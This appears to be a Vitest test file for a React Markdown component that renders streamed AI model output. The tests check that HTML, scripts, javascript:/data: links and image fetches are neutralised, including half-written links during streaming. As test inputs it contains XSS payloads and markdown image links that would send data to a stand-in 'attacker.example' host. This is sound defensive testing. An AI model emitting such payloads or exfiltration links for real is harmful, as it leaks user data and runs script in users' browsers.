import { render } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { describe, expect, it, vi } from "vitest";
import { Markdown } from "./Markdown";

const rendered = (text: string) => render(<Markdown text={text} />).container;

describe("model output", () => {
  it("never becomes live HTML", () => {
    const box = rendered('<img src=x onerror="alert(1)"> <script>alert(2)</script>');
    expect(box.querySelector("img, script")).toBeNull();
  });

  it("never makes the browser fetch an image", () => {
    const box = rendered("![leak](https://attacker.example/?d=secret)");
    expect(box.querySelector("img")).toBeNull();
    expect(box.querySelector("a")?.textContent).toBe("leak");
  });

  it.each(["javascript:alert(1)", "data:text/html,<script>alert(1)</script>"])("drops a %s link", (url) => {
    expect(rendered(`[click](${url})`).querySelector("a")?.getAttribute("href") ?? "").not.toMatch(/^(javascript|data):/);
  });

  it("opens links away from this page", () => {
    const link = rendered("[docs](https://example.com/a_(b))").querySelector("a");
    expect(link?.getAttribute("href")).toBe("https://example.com/a_(b)");
    expect(link?.getAttribute("rel")).toBe("noopener noreferrer");
    expect(link?.getAttribute("target")).toBe("_blank");
  });

  it("keeps snake_case names and single newlines", () => {
    const box = rendered("use search_docs_now\nthen `query_employees`");
    expect(box.querySelector("em")).toBeNull();
    expect(box.querySelector("br")).not.toBeNull();
    expect(box.querySelector("code")?.textContent).toBe("query_employees");
  });
});

const arriving = (text: string) => render(<Markdown text={text} streaming animate />).container;

describe("model output while it streams", () => {
  it("formats what is not closed yet instead of showing its markers", () => {
    const box = arriving("## Rosters\n\nThe **Sales team");
    expect(box.querySelector("h2")?.textContent).toBe("Rosters");
    expect(box.querySelector("strong")?.textContent).toBe("Sales team");
    expect(box.textContent).not.toMatch(/[*#]/);
    const code = arriving("calls `query_emp");
    expect(code.querySelector("code")?.textContent).toBe("query_emp");
  });

  it.each([
    "see [the docs](https://attacker.example/?d=sec",
    "![leak](https://attacker.example/?d=sec",
    '<img src=x onerror="alert(1)"> [click](javascript:alert(1)',
  ])("never makes a half-written address live: %s", (text) => {
    const box = arriving(text);
    expect(box.querySelector("img, script, a")).toBeNull();
  });

  it("keeps the other two properties with the fade on", () => {
    const box = arriving("![leak](https://attacker.example/?d=secret) <script>alert(2)</script>");
    expect(box.querySelector("img, script")).toBeNull();
    expect(box.querySelector("a")?.textContent).toBe("leak");
  });

  it("gives each word its own span to fade, but leaves code whole", () => {
    const box = arriving("two words\n\n```json\n{ \"a\": 1 }\n```");
    expect([...box.querySelectorAll("p .fade-in")].map((node) => node.textContent)).toEqual(["two", "words"]);
    expect(box.querySelector("pre .fade-in")).toBeNull();
    expect(box.querySelector("pre")?.textContent).toBe('{ "a": 1 }\n');
  });

  it("keeps the words already on screen when more arrive, so only the new ones fade", () => {
    const view = render(<Markdown text="Engineering has" streaming animate />);
    const first = view.container.querySelector(".fade-in");
    view.rerender(<Markdown text="Engineering has two people" streaming animate />);
    expect(view.container.querySelector(".fade-in")).toBe(first);
  });
});

describe("a code block", () => {
  it("names its language and copies exactly its text", async () => {
    const user = userEvent.setup();
    const box = rendered("```json\n[1, 2]\n```");
    expect(box.querySelector(".code-block-header span")?.textContent).toBe("json");
    await user.click(box.querySelector("button")!);
    expect(await navigator.clipboard.readText()).toBe("[1, 2]\n");
    expect(box.querySelector("button")?.textContent).toBe("Copied");
  });

  it("stays usable when the browser refuses the clipboard", async () => {
    const user = userEvent.setup();
    const write = vi.spyOn(navigator.clipboard, "writeText").mockRejectedValue(new Error("denied"));
    const box = rendered("```\nx\n```");
    await user.click(box.querySelector("button")!);
    expect(write).toHaveBeenCalledOnce();
    expect(box.querySelector("button")?.textContent).toBe("Copy");
  });
});
